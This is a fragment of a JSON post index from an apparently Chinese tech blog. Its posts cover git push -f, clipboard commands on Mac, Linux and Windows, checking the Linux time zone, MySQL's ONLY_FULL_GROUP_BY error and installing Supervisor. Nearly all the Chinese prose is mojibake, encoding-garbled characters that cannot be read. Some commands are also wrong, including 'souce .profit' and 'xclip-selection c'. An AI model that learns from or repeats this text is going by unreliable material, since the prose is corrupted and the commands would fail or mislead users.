å‘½ä»¤è¯¦è§£","slug":"detailed-explanation-of-git-push-f-command","date":"2020-08-05T06:49:02.000Z","updated":"2020-12-10T03:37:24.822Z","comments":true,"path":"detailed-explanation-of-git-push-f-command/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/","excerpt":"æœ€è¿‘é‡åˆ°äº†ä¸€ä¸ªGit Push ç›¸å…³çš„é—®é¢˜ï¼ŒåŒäº‹ä¸å°å¿ƒæŠŠä¸€äº›é”™è¯¯ä»£ç æäº¤åˆ°ä»“åº“äº†ã€‚å¦‚æœæ¯ä¸ªäººç›´æ¥æ›´æ–°çš„è¯ï¼Œä¼šå¯¼è‡´é”™è¯¯ä»£ç ä¹Ÿæ›´æ–°åˆ°æœ¬åœ°äº†ã€‚ è¿™ä¸ªæ—¶å€™æƒ³è¦é¿å…è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œå”¯ä¸€å¯ä»¥åšçš„å°±æ˜¯å°†é‚£äº›é”™è¯¯ä»£ç ç›´æ¥è¦†ç›–æ‰ã€‚","text":"æœ€è¿‘é‡åˆ°äº†ä¸€ä¸ªGit Push ç›¸å…³çš„é—®é¢˜ï¼ŒåŒäº‹ä¸å°å¿ƒæŠŠä¸€äº›é”™è¯¯ä»£ç æäº¤åˆ°ä»“åº“äº†ã€‚å¦‚æœæ¯ä¸ªäººç›´æ¥æ›´æ–°çš„è¯ï¼Œä¼šå¯¼è‡´é”™è¯¯ä»£ç ä¹Ÿæ›´æ–°åˆ°æœ¬åœ°äº†ã€‚ è¿™ä¸ªæ—¶å€™æƒ³è¦é¿å…è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼Œå”¯ä¸€å¯ä»¥åšçš„å°±æ˜¯å°†é‚£äº›é”™è¯¯ä»£ç ç›´æ¥è¦†ç›–æ‰ã€‚ git push -fgit push -f è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯å°†è‡ªå·±æœ¬åœ°ä»“åº“çš„ä»£ç ç›´æ¥æ¨é€è‡³ä»“åº“ï¼Œå®Œå…¨ä»¥ä½ çš„æäº¤ä¸ºå‡†ï¼Œä¹‹å‰å…¶ä»–äººçš„æäº¤éƒ½ä¼šè¢«è¦†ç›–ã€‚ é‚£ä¹ˆè¿™ä¹ˆå¯æ€•çš„å‘½ä»¤ï¼Œç©¶ç«Ÿåœ¨ä»€ä¹ˆæƒ…å†µä¸‹æ‰é€‚ç”¨å‘¢ï¼Ÿ ä½¿ç”¨æ—¶æœºæœ‰ä¸¤ç§æƒ…å†µä¸‹é€‚åˆä½¿ç”¨è¿™ä¸ªå‘½ä»¤ï¼š ç¡®å®šéœ€è¦è¦†è¦†ç›–æäº¤ï¼Œå°±åƒä¸Šé¢çš„é‚£ç§æƒ…å†µï¼Œåœ¨æ˜ç¡®éƒ¨åˆ†æäº¤ä¼šå¯¼è‡´å¼‚å¸¸æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ–°çš„æäº¤å»è¦†ç›–ã€‚ éœ€è¦æ•´ç†å†å²æäº¤è®°å½•æ—¶ï¼Œæœ‰æ—¶å€™é¡¹ç›®çš„ Commit Logs å¯èƒ½æ¯”è¾ƒä¹±ï¼Œä¸èƒ½æ¸…æ™°çš„çœ‹å‡ºæ¯ä¸€æ¬¡æäº¤çš„ä½œç”¨ï¼Œå¯ä»¥ä½¿ç”¨ rebase å‘½ä»¤æ¥æ¸…ç†å†å²æäº¤è®°å½•ã€‚å› ä¸ºæ”¹å˜äº†å†å²ï¼Œæ‰€ä»¥æ­£å¸¸æ¥è¯´æ˜¯ pushä¸æˆåŠŸçš„ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ force pushæ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ é»˜è®¤åˆ†æ”¯ä¿æŠ¤å› ä¸ºå¯èƒ½ä¼šå‡ºç°ä¸å°å¿ƒä½¿ç”¨çš„æƒ…å†µï¼ŒGithubã€Gitlabè¿™ç±»æºç æ‰˜ç®¡ç½‘ç«™ä¼šæä¾›åˆ†æ”¯ä¿æŠ¤æœºåˆ¶ã€‚å¯ä»¥é¿å…æŸä¸ªåˆ†æ”¯è¢« force pushï¼Œé»˜è®¤æ˜¯ masterä¸ºä¿æŠ¤åˆ†æ”¯ã€‚ è¿™é‡Œä»¥Gitlabä¸ºä¾‹ï¼Œè®¾ç½®-&gt;ä»“åº“-&gt;Protected Branchesï¼š æ‰€ä»¥å¦‚æœæƒ³å¼ºåˆ¶æäº¤ï¼Œå‰æéœ€è¦å–æ¶ˆå¯¹è¯¥åˆ†æ”¯çš„ä¿æŠ¤ã€‚ ä¸‡ä¸€è‡ªå·±çš„ä»£ç è¢«è¦†ç›–æ‰äº†ï¼Œè¿˜æ•‘å¾—å›æ¥å—ï¼Ÿ å…¶å®ä¹Ÿæ˜¯æœ‰åŠæ³•çš„ï¼Œé‚£å°±æ˜¯æ¢ä½ æˆ–æ˜¯å…¶å®ƒæœ‰ä¹‹å‰æäº¤çš„åŒäº‹ï¼Œå†æ¬¡è¿›è¡Œ git push -fï¼Œå°†æ­£ç¡®çš„å†…å®¹å¼ºåˆ¶æäº¤ä¸Šå»ï¼Œè¦†ç›–ä¸Šä¸€æ¬¡git push -fæ‰€é€ æˆçš„ç¾éš¾ã€‚ å‚è€ƒé“¾æ¥è½èªª git push -f é€™å€‹æŒ‡ä»¤å¾ˆå¯æ€•ï¼Œä»€éº¼æƒ…æ³å¯ä»¥ä½¿ç”¨å®ƒå‘¢ï¼Ÿ","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Windows/Mac/Linux å¦‚ä½•å°†å†…å®¹è¾“å‡ºåˆ°å‰ªè´´æ¿","slug":"how-to-output-content-to-clipboard-on-windows-mac-linux","date":"2020-08-05T02:07:41.000Z","updated":"2020-09-27T01:22:11.596Z","comments":true,"path":"how-to-output-content-to-clipboard-on-windows-mac-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/","excerpt":"å¦‚ä½•å°†è¾“å‡ºç›´æ¥å¤åˆ¶è‡³å‰ªåˆ‡æ¿ï¼Ÿåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­ï¼Œæ‰€ä½¿ç”¨çš„å‘½ä»¤æ˜¯ä¸åŒçš„ã€‚","text":"å¦‚ä½•å°†è¾“å‡ºç›´æ¥å¤åˆ¶è‡³å‰ªåˆ‡æ¿ï¼Ÿåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­ï¼Œæ‰€ä½¿ç”¨çš„å‘½ä»¤æ˜¯ä¸åŒçš„ã€‚ Mac12345678&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello mac&quot; | pbcopy&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ pbcopy &lt; remade.md&#x2F;&#x2F; å°†å‰ªåˆ‡æ¿ä¸­çš„å†…å®¹ç²˜è´´è‡³æ–‡ä»¶$ pbpaste &gt; remade.md LinuxLinux ç”¨æˆ·éœ€è¦å…ˆå®‰è£… xclipï¼Œå®ƒå»ºç«‹äº†ç»ˆç«¯å’Œå‰ªåˆ‡æ¿ä¹‹é—´çš„é€šé“ã€‚ 123456789101112&#x2F;&#x2F; æŸ¥çœ‹å‰ªåˆ‡æ¿ä¸­çš„å†…å®¹$ xclip -o$ xclip -selection c -o&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello xclip&quot; | xclip-selection c&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ xclip -selection c remade.md&#x2F;&#x2F; å°†å‰ªåˆ‡æ¿ä¸­çš„å†…å®¹ç²˜è´´è‡³æ–‡ä»¶$ xclip -selection c -o &gt; remade.md æˆ–è€…ç›´æ¥ä½¿ç”¨xselå‘½ä»¤ï¼š 12345&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello linux&quot; | xsel&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ xsel &lt; remade.md éœ€è¦æ³¨æ„çš„æ˜¯ï¼šxselã€xclip å‘½ä»¤æ˜¯åœ¨ X ç¯å¢ƒä¸‹ä½¿ç”¨çš„ï¼Œæ‰€ä»¥è¿œç¨‹è¿æ¥æœåŠ¡å™¨æ—¶ä½¿ç”¨ä¼šæŠ¥å¼‚å¸¸ï¼š 1xclip error can&#39;t open display (null) Windows12345&#x2F;&#x2F; å°†è¾“å‡ºå¤åˆ¶è‡³å‰ªè´´æ¿$ echo &quot;hello windows&quot; | clip&#x2F;&#x2F; å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è‡³å‰ªè´´æ¿$ clip &lt; remade.txt","categories":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"å¦‚ä½•æŸ¥çœ‹ Linux é»˜è®¤æ—¶åŒº","slug":"how-to-check-the-linux-default-time-zone","date":"2020-08-03T14:03:08.000Z","updated":"2020-08-25T02:19:08.477Z","comments":true,"path":"how-to-check-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/","excerpt":"æœ€è¿‘é‡åˆ°ä¸€ä¸ªè·ŸæœåŠ¡å™¨æ—¶åŒºç›¸å…³çš„é—®é¢˜ï¼Œæ²¡å‡†å¤‡å……åˆ†ï¼Œå½“é—®é¢˜çœŸæ­£æ¥ä¸´æ—¶ï¼Œå¾ˆæ‡µã€‚ ç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œç³»ç»Ÿæ—¶åŒºæ˜¯ç‰¹åˆ«é‡è¦çš„å­˜åœ¨ï¼Œå¾ˆå¤šåº”ç”¨åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯å–çš„ç³»ç»Ÿæ—¶åŒºï¼Œå¦‚æœæ—¶åŒºå¤„ç†ä¸å¾—å½“çš„è¯ï¼Œå¯èƒ½ä¼šé€ æˆä¸å¿…è¦çš„å›°æ‰°ã€‚","text":"æœ€è¿‘é‡åˆ°ä¸€ä¸ªè·ŸæœåŠ¡å™¨æ—¶åŒºç›¸å…³çš„é—®é¢˜ï¼Œæ²¡å‡†å¤‡å……åˆ†ï¼Œå½“é—®é¢˜çœŸæ­£æ¥ä¸´æ—¶ï¼Œå¾ˆæ‡µã€‚ ç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œç³»ç»Ÿæ—¶åŒºæ˜¯ç‰¹åˆ«é‡è¦çš„å­˜åœ¨ï¼Œå¾ˆå¤šåº”ç”¨åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯å–çš„ç³»ç»Ÿæ—¶åŒºï¼Œå¦‚æœæ—¶åŒºå¤„ç†ä¸å¾—å½“çš„è¯ï¼Œå¯èƒ½ä¼šé€ æˆä¸å¿…è¦çš„å›°æ‰°ã€‚ æ—¶åŒºçš„æ¦‚å¿µå…³äºæ—¶åŒºï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªæ ‡å‡†ï¼š CSTï¼šåŒ—ç¾ä¸­éƒ¨æ ‡å‡†æ—¶é—´ UTCï¼šåè°ƒä¸–ç•Œæ—¶ï¼Œåˆç§°ä¸–ç•Œæ ‡å‡†æ—¶é—´ï¼Œç®€ç§°UTCï¼Œä»è‹±æ–‡å›½é™…æ—¶é—´/æ³•æ–‡åè°ƒæ—¶é—´â€Universal Time/Temps CordonnÃ©â€è€Œæ¥ã€‚ä¸­å›½å¤§é™†ã€é¦™æ¸¯ã€æ¾³é—¨ã€å°æ¹¾ã€è’™å¤å›½ã€æ–°åŠ å¡ã€é©¬æ¥è¥¿äºšã€è²å¾‹å®¾ã€æ¾³æ´²è¥¿éƒ¨çš„æ—¶é—´ä¸UTCçš„æ—¶å·®å‡ä¸º+8ï¼Œä¹Ÿå°±æ˜¯UTC+8ã€‚ GMTï¼šæ ¼æ—å°¼æ²»æ ‡å‡†æ—¶é—´ï¼ˆæ—§è¯‘æ ¼æ—å¨æ²»å¹³å‡æ—¶é—´æˆ–æ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´ï¼›è‹±è¯­ï¼šGreenwich Mean Timeï¼ŒGMTï¼‰æ˜¯æŒ‡ä½äºè‹±å›½ä¼¦æ•¦éƒŠåŒºçš„çš‡å®¶æ ¼æ—å°¼æ²»å¤©æ–‡å°çš„æ ‡å‡†æ—¶é—´ï¼Œå› ä¸ºæœ¬åˆå­åˆçº¿è¢«å®šä¹‰åœ¨é€šè¿‡é‚£é‡Œçš„ç»çº¿ã€‚ Linux çš„æ—¶é—´åˆ†ä¸ºä¸¤ç§ï¼š ç¡¬ä»¶æ—¶é—´ï¼šç”± BIOSï¼ˆæˆ–CMOSï¼‰æ‰€è´Ÿè´£ã€‚ ç³»ç»Ÿæ—¶é—´ï¼šç”± Linux æ‰€è´Ÿè´£ï¼Œç³»ç»Ÿæ—¶é—´åœ¨ç³»ç»Ÿå¼€å…³æœºåè¯»å–ç¡¬ä»¶æ—¶é—´åï¼Œå†ç”± Linux ç®¡ç†æ—¶é—´ã€‚ datedateå‘½ä»¤æ˜¯æ˜¾ç¤ºæˆ–è®¾ç½®ç³»ç»Ÿæ—¶é—´ä¸æ—¥æœŸã€‚ è¿™ä¸ªæ˜¯æœ€ç®€å•ã€æœ€ç›´è§‚è·å–ç³»ç»Ÿæ—¶é—´ä¸æ—¥æœŸçš„æ–¹å¼äº†ã€‚ 12$ dateThu Jul 30 13:23:50 CST 2020 æ˜¾ç¤ºæ‰€åœ¨æ—¶åŒºï¼š 12date +&quot;%Z %z&quot;CST +0800 æ³¨æ„ + å’Œ &quot;ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ï¼Œå¦åˆ™ä¼šæŠ¥è¡¨ã€‚ date å‘½ä»¤å¸¸è§å‚æ•°ï¼š 12345678910111213141516171819202122232425%H å°æ—¶ï¼Œ24å°æ—¶åˆ¶ï¼ˆ00~23ï¼‰%I å°æ—¶ï¼Œ12å°æ—¶åˆ¶ï¼ˆ01~12ï¼‰%k å°æ—¶ï¼Œ24å°æ—¶åˆ¶ï¼ˆ0~23ï¼‰%l å°æ—¶ï¼Œ12å°æ—¶åˆ¶ï¼ˆ1~12ï¼‰%M åˆ†é’Ÿï¼ˆ00~59ï¼‰%p æ˜¾ç¤ºå‡ºAMæˆ–PM%r æ˜¾ç¤ºæ—¶é—´ï¼Œ12å°æ—¶åˆ¶ï¼ˆhh:mm:ss %pï¼‰%s ä»1970å¹´1æœˆ1æ—¥00:00:00åˆ°ç›®å‰ç»å†çš„ç§’æ•°%S æ˜¾ç¤ºç§’ï¼ˆ00~59ï¼‰%T æ˜¾ç¤ºæ—¶é—´ï¼Œ24å°æ—¶åˆ¶ï¼ˆhh:mm:ssï¼‰%X æ˜¾ç¤ºæ—¶é—´çš„æ ¼å¼ï¼ˆ%H:%M:%Sï¼‰%Z ä»¥å­—ç¬¦ä¸²çš„å½¢å¼æ˜¾ç¤ºæ—¶åŒºï¼Œæ—¥æœŸåŸŸï¼ˆCSTï¼‰%z ä»¥æ•°å­—çš„å½¢å¼æ˜¾ç¤ºæ—¶åŒº (+0800)%a æ˜ŸæœŸçš„ç®€ç§°ï¼ˆSun~Satï¼‰%A æ˜ŸæœŸçš„å…¨ç§°ï¼ˆSunday~Saturdayï¼‰%h,%b æœˆçš„ç®€ç§°ï¼ˆJan~Decï¼‰%B æœˆçš„å…¨ç§°ï¼ˆJanuary~Decemberï¼‰%c æ—¥æœŸå’Œæ—¶é—´ï¼ˆTue Nov 20 14:12:58 2012ï¼‰%d ä¸€ä¸ªæœˆçš„ç¬¬å‡ å¤©ï¼ˆ01~31ï¼‰%x,%D æ—¥æœŸï¼ˆmm&#x2F;dd&#x2F;yyï¼‰%j ä¸€å¹´çš„ç¬¬å‡ å¤©ï¼ˆ001~366ï¼‰%m æœˆä»½ï¼ˆ01~12ï¼‰%w ä¸€ä¸ªæ˜ŸæœŸçš„ç¬¬å‡ å¤©ï¼ˆ0ä»£è¡¨æ˜ŸæœŸå¤©ï¼‰%W ä¸€å¹´çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ˆ00~53ï¼Œæ˜ŸæœŸä¸€ä¸ºç¬¬ä¸€å¤©ï¼‰%y å¹´çš„æœ€åä¸¤ä¸ªæ•°å­—ï¼ˆ1999åˆ™æ˜¯99ï¼‰ timedatectltimedatectl å‘½ä»¤éå¸¸çš„æ–¹ä¾¿ï¼Œå½“ä½ ä¸å¸¦ä»»ä½•å‚æ•°è¿è¡Œå®ƒæ—¶ï¼Œè¿™æ¡å‘½ä»¤å¯ä»¥åƒä¸‹å›¾ä¸€æ ·ï¼Œè¾“å‡ºç³»ç»Ÿæ—¶é—´æ¦‚è§ˆï¼Œå…¶ä¸­åŒ…å«å½“å‰æ—¶åŒºï¼š 123456789$ timedatectlLocal time: Thu 2020-07-30 05:30:21 UTC Universal time: Thu 2020-07-30 05:30:21 UTC RTC time: Thu 2020-07-30 05:30:21 Time zone: Etc&#x2F;UTC (UTC, +0000) System clock synchronized: yessystemd-timesyncd.service active: yes RTC in local TZ: no åªæŸ¥çœ‹æ—¶åŒºï¼š 1$ timedatectl | grep &quot;Time zone&quot; /etc/timezoneä½¿ç”¨ cat å‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶ /etc/timezone çš„å†…å®¹ï¼Œæ¥æŸ¥çœ‹æ—¶åŒºï¼š 12$ cat &#x2F;etc&#x2F;timezoneEtc&#x2F;UTC é€‰æ‹©æ—¶åŒº 1$ tzselect é€‰æ‹©å®Œæˆä¹‹åï¼Œå°†æ—¶åŒºç›¸å…³çš„é…ç½®ï¼Œå†™å…¥.profité…ç½®æ–‡ä»¶ä¸­ã€‚ ç„¶åä½¿ç”¨ souce å‘½ä»¤ï¼Œå¼ºåˆ¶ç”Ÿæ•ˆã€‚ 1souce .profit å‚è€ƒé“¾æ¥ åœ¨ Linux ä¸­æŸ¥çœ‹æ—¶åŒº Linux date å‘½ä»¤ ä¸–ç•Œæ—¶é’Ÿåœ°å›¾","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql only_full_group_by å¼‚å¸¸è®°å½•","slug":"mysql-only-full-group-by-exception-record","date":"2020-07-31T12:17:14.000Z","updated":"2021-06-14T08:18:25.903Z","comments":true,"path":"mysql-only-full-group-by-exception-record/","link":"","permalink":"https://www.0x2beace.com/mysql-only-full-group-by-exception-record/","excerpt":"","text":"æœ€è¿‘å¾ˆé¢‘ç¹çš„é‡åˆ°ä¸€ä¸ªMysql å¼‚å¸¸ï¼Œé”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column â€˜cis.q1.query_dateâ€™ which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by é€šè¿‡é”™è¯¯ä¿¡æ¯å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯å› ä¸º sql_mode å¼•èµ·çš„ã€‚ æŸ¥çœ‹Mysql å½“å‰æ‰€ä½¿ç”¨çš„ sql_modeï¼š 1234567select @@sql_mode+-------------------------+| @@sql_mode |+-------------------------+| ONLY_FULL_GROUP_BY |+-------------------------+ sql_mode é…ç½®è§£æONLY_FULL_GROUP_BYå¯¹äºGROUP BYèšåˆæ“ä½œï¼Œå¦‚æœåœ¨SELECTä¸­çš„åˆ—ï¼Œæ²¡æœ‰åœ¨GROUP BYä¸­å‡ºç°ï¼Œé‚£ä¹ˆè¿™ä¸ªSQLæ˜¯ä¸åˆæ³•çš„ï¼Œå› ä¸ºåˆ—ä¸åœ¨GROUP BYä»å¥ä¸­ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯SELECTåé¢æ¥çš„åˆ—å¿…é¡»è¢«GROUP BYåé¢æ¥çš„åˆ—æ‰€åŒ…å«ã€‚å¦‚ï¼š 12345âselect a,b from table group by a,b,c; âœ…select a,b,c from table group by a,b; è¿™ä¸ªé…ç½®ä¼šä½¿å¾—GROUP BYè¯­å¥ç¯å¢ƒå˜å¾—ååˆ†ç‹­çª„ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½ä¸åŠ è¿™ä¸ªé…ç½® NO_AUTO_VALUE_ON_ZEROè¯¥å€¼å½±å“è‡ªå¢é•¿åˆ—çš„æ’å…¥ã€‚é»˜è®¤è®¾ç½®ä¸‹ï¼Œæ’å…¥0æˆ–NULLä»£è¡¨ç”Ÿæˆä¸‹ä¸€ä¸ªè‡ªå¢é•¿å€¼ã€‚ï¼ˆä¸ä¿¡çš„å¯ä»¥è¯•è¯•ï¼Œé»˜è®¤çš„sql_modeä½ åœ¨è‡ªå¢ä¸»é”®åˆ—è®¾ç½®ä¸º0ï¼Œè¯¥å­—æ®µä¼šè‡ªåŠ¨å˜ä¸ºæœ€æ–°çš„è‡ªå¢å€¼ï¼Œæ•ˆæœå’Œnullä¸€æ ·ï¼‰ï¼Œå¦‚æœç”¨æˆ·å¸Œæœ›æ’å…¥çš„å€¼ä¸º0ï¼ˆä¸æ”¹å˜ï¼‰ï¼Œè¯¥åˆ—åˆæ˜¯è‡ªå¢é•¿çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªé€‰é¡¹å°±æœ‰ç”¨äº†ã€‚ STRICT_TRANS_TABLESåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œå¦‚æœä¸€ä¸ªå€¼ä¸èƒ½æ’å…¥åˆ°ä¸€ä¸ªäº‹åŠ¡è¡¨ä¸­ï¼Œåˆ™ä¸­æ–­å½“å‰çš„æ“ä½œï¼Œå¯¹éäº‹åŠ¡è¡¨ä¸åšé™åˆ¶ã€‚ï¼ˆInnoDBé»˜è®¤äº‹åŠ¡è¡¨ï¼ŒMyISAMé»˜è®¤éäº‹åŠ¡è¡¨ï¼›MySQLäº‹åŠ¡è¡¨æ”¯æŒå°†æ‰¹å¤„ç†å½“åšä¸€ä¸ªå®Œæ•´çš„ä»»åŠ¡ç»Ÿä¸€æäº¤æˆ–å›æ»šï¼Œå³å¯¹åŒ…å«åœ¨äº‹åŠ¡ä¸­çš„å¤šæ¡è¯­å¥è¦ä¹ˆå…¨æ‰§è¡Œï¼Œè¦ä¹ˆå…¨éƒ¨ä¸æ‰§è¡Œã€‚éäº‹åŠ¡è¡¨åˆ™ä¸æ”¯æŒæ­¤ç§æ“ä½œï¼Œæ‰¹å¤„ç†ä¸­çš„è¯­å¥å¦‚æœé‡åˆ°é”™è¯¯ï¼Œåœ¨é”™è¯¯å‰çš„è¯­å¥æ‰§è¡ŒæˆåŠŸï¼Œä¹‹åçš„åˆ™ä¸æ‰§è¡Œï¼›MySQLäº‹åŠ¡è¡¨æœ‰è¡¨é”ä¸è¡Œé”éäº‹åŠ¡è¡¨åˆ™åªæœ‰è¡¨é”ï¼‰ NO_ZERO_IN_DATEåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œä¸å…è®¸æ—¥æœŸå’Œæœˆä»½ä¸ºé›¶ NO_ZERO_DATEè®¾ç½®è¯¥å€¼ï¼Œmysqlæ•°æ®åº“ä¸å…è®¸æ’å…¥é›¶æ—¥æœŸï¼Œæ’å…¥é›¶æ—¥æœŸä¼šæŠ›å‡ºé”™è¯¯è€Œä¸æ˜¯è­¦å‘Šã€‚ ERROR_FOR_DIVISION_BY_ZEROåœ¨INSERTæˆ–UPDATEè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ•°æ®è¢«é›¶é™¤ï¼Œåˆ™äº§ç”Ÿé”™è¯¯è€Œéè­¦å‘Šã€‚å¦‚ æœæœªç»™å‡ºè¯¥æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®è¢«é›¶é™¤æ—¶MySQLè¿”å›NULL NO_AUTO_CREATE_USERç¦æ­¢GRANTåˆ›å»ºå¯†ç ä¸ºç©ºçš„ç”¨æˆ· NO_ENGINE_SUBSTITUTIONå¦‚æœéœ€è¦çš„å­˜å‚¨å¼•æ“è¢«ç¦ç”¨æˆ–æœªç¼–è¯‘ï¼Œé‚£ä¹ˆæŠ›å‡ºé”™è¯¯ã€‚ä¸è®¾ç½®æ­¤å€¼æ—¶ï¼Œç”¨é»˜è®¤çš„å­˜å‚¨å¼•æ“æ›¿ä»£ï¼Œå¹¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ PIPES_AS_CONCATå°†â€||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼ ANSI_QUOTESå¯ç”¨ANSI_QUOTESåï¼Œä¸èƒ½ç”¨åŒå¼•å·æ¥å¼•ç”¨å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«è§£é‡Šä¸ºè¯†åˆ«ç¬¦ è§£å†³æ–¹æ¡ˆæœ‰ä¸‰ç§æ–¹å¼å¯ä»¥è§£å†³è¯¥é—®é¢˜ã€‚ å…³é—­ ONLY_FULL_GROUP_BYå…³é—­ Mysql çš„ ONLY_FULL_GROUP_BY æ¨¡å¼ åˆæœ‰ä¸¤ç§æ–¹å¼ã€‚ æ–¹å¼ä¸€ï¼šé€šè¿‡ä»¥ä¸‹å‘½ä»¤å…³é—­ï¼š 1SET SESSION sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY,','')); æ–¹å¼äºŒï¼šç¼–è¾‘my.cnfé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹é…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼š 123mysql --help | grep cnf order of preference, my.cnf, $MYSQL_TCP_PORT,/etc/my.cnf /etc/mysql/my.cnf /usr/local/etc/my.cnf ~/.my.cnf å°† ONLY_FULL_GROUP_BY å…³é”®å­—å»æ‰ï¼š 12[mysqld]sql_mode = \"\" ç„¶åé‡å¯Mysql æœåŠ¡å³å¯ã€‚ ANY_VALUEå¦‚æœä½ ä¸æƒ³æ›´æ–°é…ç½®æ–‡ä»¶ï¼ŒMysql è¿˜æä¾›ä¸€ç§ä¸´æ—¶çš„è§£å†³æ–¹æ¡ˆâ€”â€”ANY_VALUE()ã€‚ ä½¿ç”¨ ANY_VALUE() åŒ…è£¹çš„å€¼ä¸ä¼šè¢«æ£€æŸ¥ï¼Œè·³è¿‡è¯¥é”™è¯¯ã€‚ 1234âœ…select ANY_VALUE(a), ANY_VALUE(b), ANY_VALUE(c)from table group by a,b; å‚è€ƒé“¾æ¥ è®°ä¸€æ¬¡Group by æŸ¥è¯¢æ—¶çš„ONLY_FULL_GROUP_BYé”™è¯¯ä»¥åŠåç»­ MySQL GROUP BY çš„é—®é¢˜","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Supervisor å¿«é€Ÿä¸Šæ‰‹","slug":"supervisor-quick-start","date":"2020-07-30T12:38:38.000Z","updated":"2020-09-04T13:54:06.076Z","comments":true,"path":"supervisor-quick-start/","link":"","permalink":"https://www.0x2beace.com/supervisor-quick-start/","excerpt":"supervisord æ˜¯ä¸€ä¸ªç”¨ Python å†™çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œæ˜¯ç±»Unixç³»ç»Ÿä¸­çš„ä¸€ä¸ªè¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œ Supervisor åªé€‚ç”¨äºç±»Unix ç³»ç»Ÿï¼Œä¸é€‚ç”¨äºWindowã€‚","text":"supervisord æ˜¯ä¸€ä¸ªç”¨ Python å†™çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œæ˜¯ç±»Unixç³»ç»Ÿä¸­çš„ä¸€ä¸ªè¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œ Supervisor åªé€‚ç”¨äºç±»Unix ç³»ç»Ÿï¼Œä¸é€‚ç”¨äºWindowã€‚ å®‰è£…å› ä¸ºSupervisor æ˜¯ç”¨ Python æ‰€å†™çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨pip å®‰è£…ï¼š 1sudo pip install supervisor Ubuntuï¼š 1apt-get install supervisor Macï¼š 1brew install supervisor 